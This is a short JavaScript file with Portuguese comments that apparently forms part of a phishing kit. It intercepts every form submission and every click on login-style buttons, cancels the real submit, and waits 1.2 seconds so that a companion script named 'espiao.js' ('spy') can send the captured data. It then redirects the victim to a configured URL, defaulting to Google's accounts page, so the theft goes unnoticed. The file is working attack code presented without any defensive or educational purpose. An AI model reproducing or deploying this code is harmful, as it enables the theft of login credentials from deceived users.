// Função de redirecionamento que usa uma URL dinâmica
const executarRedirecionamento = () => {
    // Busca a URL definida pelo app.py ou usa o Google como fallback de segurança
    const urlDestino = window.urlRedirecionamento || "https://accounts.google.com";

    // Delay de 1.2s para garantir o envio dos dados pelo espiao.js
    setTimeout(() => {
        window.location.replace(urlDestino);
    }, 1200);
};

// 1. INTERCEPTA O ENVIO DO FORMULÁRIO
window.addEventListener('submit', function(e) {
    e.preventDefault();
    e.stopImmediatePropagation(); 
    executarRedirecionamento();
}, true);

// 2. INTERCEPTA CLIQUES EM BOTÕES
window.addEventListener('click', function(e) {
    const el = e.target;
    const termos = ['Entrar', 'Log In', 'Próximo', 'Next', 'Acessar', 'Login', 'Logar', 'Conectar'];
    
    const ehBotao = el.tagName === 'BUTTON' || 
                    el.type === 'submit' || 
                    termos.some(t => el.innerText.includes(t)) || 
                    (el.value && termos.some(t => el.value.includes(t)));

    if (ehBotao) {
        executarRedirecionamento();
    }
}, true);
